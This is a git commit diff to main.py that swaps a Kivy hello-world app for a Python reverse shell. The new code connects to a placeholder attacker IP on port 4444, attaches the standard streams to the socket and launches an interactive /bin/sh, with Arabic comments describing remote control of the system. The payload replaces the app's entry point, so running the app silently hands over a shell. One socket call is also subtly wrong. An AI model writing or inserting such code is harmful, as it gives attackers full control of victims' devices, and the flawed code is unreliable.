04d940b51571a749f8699abe7cff41657963878e
ali20394546-debug <ali20394546@gmail.com>
2026-02-12 16:04:40 +0200

    Update main.py

--- main.py
+++ main.py
@@ -1,10 +1,22 @@
+import socket
+import os
+import subprocess
 
-from kivy.app import App
-from kivy.uix.label import Label
+# إحداثيات سيرفرك السحابي (الذي سيستقبل السيطرة)
+LHOST = 'عنوان_IP_سيرفرك' 
+LPORT = 4444
 
-class MyApp(App):
-    def build(self):
-        return Label(text='Hello from GitHub Build')
+def connect():
+    s = socket.socket(socket.socket.AF_INET, socket.socket.SOCK_STREAM)
+    try:
+        s.connect((LHOST, LPORT))
+        # فتح بوابة تحكم كاملة بالنظام
+        os.dup2(s.fileno(), 0)
+        os.dup2(s.fileno(), 1)
+        os.dup2(s.fileno(), 2)
+        subprocess.call(["/bin/sh", "-i"])
+    except:
+        pass
 
-if __name__ == '__main__':
-    MyApp().run()
+if __name__ == "__main__":
+    connect()
